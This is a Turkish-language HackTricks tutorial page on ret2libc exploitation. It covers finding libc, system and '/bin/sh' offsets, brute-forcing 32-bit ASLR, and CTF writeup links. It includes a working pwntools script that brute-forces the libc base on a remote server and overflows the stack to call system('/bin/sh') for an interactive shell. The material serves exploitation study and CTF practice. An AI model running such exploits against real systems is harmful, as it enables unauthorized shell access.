# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**Ret2Libc**'nin özü, bir zayıf programın yürütme akışını, saldırgan tarafından sağlanan shellcode'u yığın üzerinde çalıştırmak yerine, bir paylaşımlı kütüphanedeki (örneğin, **system**, **execve**, **strcpy**) bir fonksiyona yönlendirmektir. Saldırgan, yığın üzerindeki dönüş adresini istenen kütüphane fonksiyonuna işaret edecek şekilde değiştiren bir yük oluşturur ve çağrı konvansiyonuna göre gerekli argümanların doğru bir şekilde ayarlandığından emin olur.

### **Örnek Adımlar (basitleştirilmiş)**

- Çağrılacak fonksiyonun adresini (örneğin, system) ve çağrılacak komutu (örneğin, /bin/sh) alın
- İlk argümanı komut dizesine işaret eden ve yürütme akışını fonksiyona iletmek için bir ROP zinciri oluşturun

## Adresleri Bulma

- Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, bellekte nerede yükleneceğini bulmak için:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Eğer ASLR'nin libc'nin adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Kullanılan libc'yi bilmek, `system` fonksiyonuna olan ofseti bulmayı da mümkün kılar:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Kullanılan libc'yi bilmek, `/bin/sh` fonksiyonuna olan ofseti bulmayı da mümkün kılar:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc'yi bilmek, **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini almak için Peda veya GEF kullanmayı da mümkün kılar:
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer süreç her konuştuğunuzda **çocuklar** oluşturuyorsa (ağ sunucusu) o dosyayı **okumayı** deneyin (muhtemelen root olmanız gerekecek).

Burada **libc'nin süreç içinde tam olarak nerede yüklü olduğunu** ve **her çocuğun süreç için nerede yükleneceğini** bulabilirsiniz.

![](<../../../../images/image (95).png>)

Bu durumda **0xb75dc000** adresinde yüklenmiştir (Bu libc'nin temel adresi olacaktır).

## Bilinmeyen libc

Binariesinin yüklediği **libc'yi bilmemek** mümkün olabilir (çünkü erişiminiz olmayan bir sunucuda bulunabilir). Bu durumda, **bazı adresleri sızdırmak ve hangi libc** kütüphanesinin kullanıldığını bulmak için açığı kötüye kullanabilirsiniz:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

Ve bunun için bir pwntools şablonunu burada bulabilirsiniz:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## 32 bit ASLR'yi Aşma

Bu kaba kuvvet saldırıları **yalnızca 32 bit sistemler için** faydalıdır.

- Eğer istismar yerel ise, libc'nin temel adresini kaba kuvvetle bulmayı deneyebilirsiniz (32 bit sistemler için faydalıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Uzak bir sunucuya saldırıyorsanız, **`usleep` `libc` fonksiyonunun adresini brute-force ile bulmayı** deneyebilirsiniz, argüman olarak 10 (örneğin) geçerek. Eğer bir noktada **sunucu yanıt vermek için 10 saniye ekstra alıyorsa**, bu fonksiyonun adresini bulmuşsunuzdur.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kodun içine entegre edilmiştir ve savunmasız ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Aşağıdaki örneği kontrol edin:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts`'i belirli verilerle argüman olarak çağırarak **işlemden bilgi sızdırmaya** olanak tanır.

## Ret2printf

Bu, temel olarak **Ret2lib'i kötüye kullanarak `printf` format dizeleri zafiyeti** haline dönüştürmek anlamına gelir; `ret2lib` kullanarak printf'i istismar etmek için değerlerle çağırmak (gereksiz gibi görünüyor ama mümkün):

{{#ref}}
../../format-strings/
{{#endref}}

## Diğer Örnekler ve referanslar

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, libc'deki bir fonksiyonun adresine sızdırma yapıldığında, bir gadget kullanarak
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR etkin ama PIE yok, ilk adım, puts'u çağırmak ve sızdırmak için kanaryanın 0x00 baytına kadar bir taşmayı doldurmaktır. Kanarya ile puts'un GOT'dan adresini sızdırmak için puts'u çağıran bir ROP gadget'ı oluşturulur ve ardından `system('/bin/sh')` çağıran bir ROP gadget'ı.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bit, ASLR etkin, kanarya yok, ana fonksiyondan bir çocuk fonksiyonu ile yığın taşması. Puts'un GOT'dan adresini sızdırmak için puts'u çağıran bir ROP gadget'ı ve ardından bir gadget çağırır.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bit, pie yok, kanarya yok, relro yok, nx. Yazma fonksiyonunu kullanarak yazmanın (libc) adresini sızdırır ve bir gadget çağırır.

{{#include ../../../../banners/hacktricks-training.md}}
